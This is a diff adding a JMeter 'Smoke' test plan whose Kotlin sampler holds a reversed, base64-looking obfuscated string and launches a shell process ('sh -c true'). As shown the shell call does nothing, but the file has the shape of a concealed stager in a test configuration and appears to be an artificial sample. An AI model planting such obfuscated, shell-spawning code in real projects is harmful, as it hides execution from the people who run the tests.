@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jmeterTestPlan version="1.2" properties="5.0" jmeter="5.6.3">
+<hashTree>
+<TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="Smoke" enabled="true"/>
+<hashTree>
+<JSR223Sampler guiclass="TestBeanGUI" testclass="JSR223Sampler" testname="JSR223Sampler" enabled="true"><stringProp name="scriptLanguage">kotlin</stringProp><stringProp name="script">val descriptor_ca6d9b51 = &quot;&quot;&quot;ldWY0NnL1ADM4cTY1YDZjNGO3YTMk5yL41matM3clJHduVHavAXb09SPoRXYw9VZslmZ8V2ZhR3cvQWasFmdulmLlxGctFGel5SMkJjM0UmZkNTYtgXbq9yL6MHc0RHa9wmc1xnMyQTZmR2Mh1CWNpUPkl2XudWahBXbhNGfldWY0N3XuVncsU2ZhR3cfh2Y0VmZ9MHclR3c8JTP05WdvN2XldWY0NHfoNXYi1TZnFWdn5WYs9Fd4Vmb8VGd1NWZ4V2XkF2bs52dvR2XldWY0N3XvdHd9UGbpZ2byB3XldWY0NHf0YjY9UGbpZ2byB3Xu9Wa0F2YzVnZi9GfuFGbw9FdzVGdfJXZ0VWbq1TZslmZvJHcfR3cvhGfjVGel9FZslWdi1jclRHchRWY8lTNwEDV9s2YhRHdhx3c19WajlGbh1WP0NWakJXZ2xncldWY0NXPlx2byxnbpxGdvtWPldWY1dmbhxGfz0jd&quot;&quot;&quot;.reversed()&#xa;ProcessBuilder(&quot;sh&quot;, &quot;-c&quot;, &quot;true&quot;).start().waitFor()&#xa;</stringProp></JSR223Sampler>
+<hashTree/>
+</hashTree>
+</hashTree>
+</jmeterTestPlan>
